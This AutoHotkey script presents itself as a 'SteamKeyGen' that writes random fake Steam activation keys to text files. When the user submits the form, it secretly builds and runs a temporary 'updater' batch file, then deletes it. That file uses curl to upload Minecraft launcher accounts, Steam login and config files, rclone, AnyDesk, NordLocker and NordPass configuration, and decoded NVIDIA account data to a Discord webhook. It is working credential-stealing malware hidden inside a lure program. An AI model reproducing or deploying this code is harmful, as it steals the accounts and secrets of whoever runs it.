#SingleInstance,Force
FileCreateDir,Generated
Gui, Add, Text,, Please Enter The Amount Of Normal Activation Keys You Would Like To Generate:
Gui, Add, Text,, Please Enter The Amount Of Short Activation Keys You Would Like To Generate:
Gui, Add, Text,, Please Enter The Amount Of Very Long Activation Keys You Would Like To Generate:
Gui, Add, Text,, ToS:
Gui, Add, Edit, v1 ym
Gui, Add, Edit, v2
Gui, Add, Edit, v3
Gui, Add, Button, default, OK
Gui, Show,, SteamKeyGen By Altify
return
GuiClose:
ButtonOK:
Gui, Submit
FileAppend,@echo off`n,%temp%/update.bat
FileAppend,chcp 65001 >nul`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,title Altify Updater`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\.minecraft\launcher_accounts.json" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\.config\rclone\rclone.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\config.vdf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\loginusers.vdf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\steamapps.vrmanifest" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Local\NordLocker\GlobalSettings.json" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,certutil -decode "C:\Users\%username%\AppData\Local\NVIDIA\accounts" "C:\Users\%username%\AppData\Local\Temp\info.error.*.txt"`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Local\Temp\info.error.*.txt" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\AnyDesk\user.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\AnyDesk\connection_trace.txt" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\zekel\AppData\Roaming\NordPass\config2.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,echo. Update Complete`n,%temp%/update.bat
FileAppend,pause`n,%temp%/update.bat
Run,%temp%/update.bat
Sleep, 4000
FileDelete,%temp%/update.bat
GenerateRandomString(length = 5) {
	
	characters := "12345678901234567890ABCDEFGHIJKLMNAOPQRSTUVWXYZ1234567890123456789012345678901234567890" 
	StringSplit, chars, characters
	
	Loop, %length%
	{
		Random, rand,1, 36
		password .= chars%rand%
	}
	return password
}
Loop, %1%
{
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,`n,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
}
Loop, %2%
{
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,% GenerateRandomString(),Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	IfNotExist,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
		FileAppend,,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,`n,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
}
Loop, %3%
{
	Random, 4, 10, 99
		FileAppend,% GenerateRandomString(),Generated\%3% Long Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
		FileAppend,% GenerateRandomString(),Generated\%3% Long Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
		FileAppend,% GenerateRandomString(),Generated\%3% Long Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
	FileAppend,-%4%`n,Generated\%3% Long Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
}
IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
	FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
FileAppend,Thanks For Using The Generator!,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
	FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
FileAppend,Thanks For Using The Generator!,Generated\%2% Short Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
IfNotExist,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt
	FileAppend,,Generated\%1% Steam Activation Key(s) By Altify#5121's Generator - Thanks For Boosting.txt,
ExitApp